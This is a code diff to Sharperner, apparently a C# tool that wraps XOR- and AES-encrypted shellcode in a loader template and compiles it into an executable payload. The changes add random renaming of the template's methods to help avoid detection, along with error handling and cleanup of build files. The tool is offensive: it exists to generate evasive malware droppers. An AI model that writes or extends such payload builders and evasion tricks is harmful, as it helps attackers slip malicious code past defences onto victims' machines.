@@ -102,6 +102,17 @@ namespace Sharperner
               .Select(s => s[random.Next(s.Length)]).ToArray());
         }
 
+        public static string GenerateRandomString()
+        {
+            int length = random.Next(5,10);
+            var rString = "";
+            for (var i = 0; i < length; i++)
+            {
+                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
+            }
+            return rString;
+        }
+
         public static string RandomKey(int length)
         {
             const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
@@ -432,8 +443,32 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     {
                         templateFileContent = File.ReadAllText(templateFile);
                     }
-                    // replace in template file
-                    templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+
+                    try
+                    {
+
+                        // randomize method names
+                        var pattern = @"(public|private|static|\s) +[\w\<\>\[\]]+\s+(\w+) *\([^\)]*\) *(\{?|[^;])";
+                        var methodNamesPattern = @"([a-zA-Z_{1}][a-zA-Z0-9_]+)(?=\()";
+                        Regex rg = new Regex(pattern);
+                        MatchCollection methods = rg.Matches(templateFileContent);
+                        foreach (var method in methods)
+                        {
+                            if (!method.ToString().Contains("Main"))
+                            {
+                                var methodName = Regex.Match(method.ToString(), methodNamesPattern);
+                                templateFileContent = templateFileContent.Replace(methodName.ToString(), GenerateRandomString());
+                            }
+
+                        }
+
+                        // replace in template file
+                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+                    }
+                    catch (Exception err)
+                    {
+                        Console.WriteLine($"[!] {err.Message}");
+                    }
 
                     // write all back into the file
                     try
@@ -475,7 +510,7 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     Console.WriteLine($"[+] Doing some cleaning...");
                     Thread.Sleep(1000);
 
-                    File.Delete(tempFile);
+                    //File.Delete(tempFile);
                 }
                 else if(dropperFormat == "cpp")
                 {
@@ -523,7 +558,15 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     //create backup copy of the template
                     string temp = File.ReadAllText(rootFile);
 
-                    templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+                    // replace required values
+                    try
+                    {
+                        templateFileContent = templateFileContent.Replace("REPLACE SHELLCODE HERE", xorAesEncStringB64).Replace("REPLACE XORKEY", xorKey).Replace("REPLACE A3S_KEY", morsed_aeskey).Replace("REPLACE A3S_IV", morsed_aesiv);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("[!] Error replacing values");
+                    }
 
                     // write all back into the file
                     try
@@ -577,14 +620,14 @@ Sharperner.exe /file:file.txt /out:payload.exe
                                 compiler.StartInfo.Arguments = strCmd;
                                 compiler.StartInfo.UseShellExecute = false;
                                 compiler.StartInfo.CreateNoWindow = true;
-                                compiler.StartInfo.RedirectStandardOutput = true;
+                                compiler.StartInfo.RedirectStandardError = true;
                                 compiler.Start();
                             }
 
                         }
                         catch
                         {
-                            Console.WriteLine("[!] Error Compiling. Exitingl...");
+                            Console.WriteLine("[!] Error while compiling. Exiting...");
                             Environment.Exit(0);
                         }
                     }
@@ -603,11 +646,13 @@ Sharperner.exe /file:file.txt /out:payload.exe
                     {
                         File.Copy($"{parentDir}\\loader\\x64\\Release\\loader.exe", $"{Directory.GetCurrentDirectory()}\\{outputFile}", true);
 
+                        File.Delete($"{parentDir}\\loader\\x64\\Release\\loader.exe");
+
                         Console.WriteLine($"[+] Executable file successfully generated: {outputFile}");
                     }
                     catch
                     {
-                        Console.WriteLine("[!] Couldn't find the compiled executable");
+                        Console.WriteLine("[!] Couldn't find the compiled executable. Possibly shellcode is too big");
                     }
 
                     //revert the file
